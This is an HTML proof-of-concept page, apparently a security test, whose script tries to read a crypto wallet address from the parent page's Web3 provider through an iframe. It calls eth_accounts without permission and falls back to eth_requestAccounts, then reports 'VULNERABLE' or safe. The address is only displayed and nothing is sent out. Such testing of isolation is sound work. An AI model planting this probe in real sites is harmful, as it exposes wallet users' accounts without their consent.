<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Sandbox - Exploit Test</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 15px; background: #ffffff; color: #333; margin: 0; }
        .box { border: 1px solid #ddd; padding: 15px; border-radius: 6px; background: #fafafa; }
        button { padding: 10px 15px; background: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
        button:hover { background: #0056b3; }
        #status { margin-top: 10px; padding: 8px; background: #000; color: #00ff00; font-family: monospace; font-size: 12px; border-radius: 4px; word-break: break-all; }
    </style>
</head>
<body>

    <div class="box">
        <h3>Security Sandbox</h3>
        <button id="exploitBtn">Click Here to Test Provider Leak</button>
        <div id="status">The Process Is Ready.</div>
    </div>

    <script>
        document.getElementById('exploitBtn').addEventListener('click', async () => {
            const statusEl = document.getElementById('status');
            statusEl.textContent = "Mencoba mengakses provider Web3 dari iframe...";

            try {
                // Menguji akses ke window.parent.ethereum atau window.ethereum global
                const targetProvider = window.parent.ethereum || window.ethereum;

                if (!targetProvider) {
                    statusEl.textContent = "[AMAN] Provider tidak ditemukan di dalam konteks iframe.";
                    return;
                }

                statusEl.textContent = "[!] Provider terdeteksi! Mencoba membaca akun secara diam-diam...";

                // Mencoba memanggil method RPC tanpa izin eksplisit di iframe
                const accounts = await targetProvider.request({ method: 'eth_accounts' });

                if (accounts && accounts.length > 0) {
                    statusEl.innerHTML = `<span style="color: #ff4d4d;">[VULNERABLE] BERHASIL MENCURI AKUN: ${accounts[0]}</span>`;
                } else {
                    // Coba paksa minta request accounts jika tidak terbaca langsung
                    statusEl.textContent = "[!] Mencoba memicu eth_requestAccounts dari iframe...";
                    const requestedAccounts = await targetProvider.request({ method: 'eth_requestAccounts' });
                    statusEl.innerHTML = `<span style="color: #ff4d4d;">[VULNERABLE] PROMPT / AKUN TERBACA: ${requestedAccounts[0]}</span>`;
                }

            } catch (err) {
                statusEl.innerHTML = `<span style="color: #00ff00;">[AMAN] Diblokir oleh isolasi browser: ${err.message}</span>`;
            }
        });
    </script>
</body>
</html>
